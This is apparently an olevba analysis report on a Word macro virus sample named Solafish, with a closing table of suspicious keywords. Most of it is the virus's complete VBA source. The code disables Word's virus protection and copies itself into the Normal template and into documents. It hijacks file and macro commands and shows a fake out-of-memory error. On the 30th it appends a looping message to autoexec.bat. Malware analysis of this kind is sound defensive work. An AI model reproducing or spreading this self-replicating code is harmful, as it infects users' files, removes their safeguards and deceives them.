olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Solafish.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Solafish.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Solar.bas 
in file: Virus.MSWord.Solafish.a - OLE stream: 'Macros/VBA/Solar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Autoopen()
ScreenUpdating = False
On Error GoTo Nottoday
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.BackgroundSave = False
.CreateBackup = False
End With
Application.EnableCancelKey = wdCancelDisabled
ActiveDocument.ReadOnlyRecommended = False
DisplayAlerts = wdAlertsNone
 Set ActiveDoc = ActiveDocument
 Set GlobalDoc = NormalTemplate
gins = False
NVB = NormalTemplate.VBProject.VBComponents.Count
For gi = 1 To NVB
If NormalTemplate.VBProject.VBComponents(gi).Name = "Solar" Then gins = True
Next gi
If gins = False Then Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Solar", Object:=wdOrganizerObjectProjectItems
Nottoday:
pay
ScreenUpdating = True
End Sub
Sub FileSaveAs()
On Error GoTo Nottoday
Application.EnableCancelKey = wdCancelDisabled
Dialogs(wdDialogFileSaveAs).Show
pay
Getyou
ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
Nottoday:
End Sub
Sub EditFind()
On Error GoTo Nottoday
Application.EnableCancelKey = wdCancelDisabled
Dialogs(wdDialogEditFind).Show
pay
Getyou
Nottoday:
End Sub
Sub FileOpen()
On Error GoTo Nottoday
Application.EnableCancelKey = wdCancelDisabled
Dialogs(wdDialogFileOpen).Show
pay
Getyou
Nottoday:
End Sub
Sub ToolsMacro()
On Error GoTo Nottoday
nem = MsgBox("Not enough memory to perform this action!" & vbCrLf & "Close some programs to free up memory.", 16, "Warning")
pay
Nottoday:
End Sub
Sub ViewVBcode()
On Error GoTo Nottoday
nem = MsgBox("Not enough memory to perform this action!" & vbCrLf & "Close some programs to free up memory.", 16, "Warning")
pay
Nottoday:
End Sub
Sub Getyou()
DisplayAlerts = wdAlertsNone
On Error GoTo Nottoday
ScreenUpdating = False
dins = False
NVB2 = ActiveDocument.VBProject.VBComponents.Count
Set ActiveDoc = ActiveDocument
Set GlobalDoc = NormalTemplate
For gi = 1 To NVB2
If ActiveDocument.VBProject.VBComponents(gi).Name = "Solar" Then dins = True
Next gi
If dins = False Then Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.Name, Name:="Solar", Object:=wdOrganizerObjectProjectItems
Nottoday:
ScreenUpdating = True
End Sub
Sub pay()
On Error GoTo Nottoday
If Day(Now()) <> 30 Then GoTo Nottoday:
Open "c:\autoexec.bat" For Append As #1
Print #1, ""
Print #1, ":Fish"
Print #1, "echo *****************************************************************************"
Print #1, "echo *****************************************************************************"
Print #1, "echo *****************************************************************************"
Print #1, "echo ********                                                             ********"
Print #1, "echo ********  You are infected with WM97-Solar !!! But don't panic !!!   ********"
Print #1, "echo ********  This Virus has no dangerous payload !!! It was written by  ********"
Print #1, "echo ********                      CyberFish(Germany)                     ********"
Print #1, "echo ********       Be careful, the next one will be destructive !!!      ********"
Print #1, "echo ********                                                             ********"
Print #1, "echo *****************************************************************************"
Print #1, "echo *****************************************************************************"
Print #1, "echo *****************************************************************************"
Print #1, "Pause"
Print #1, "cls"
Print #1, "goto Fish"
Close 1
Nottoday:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

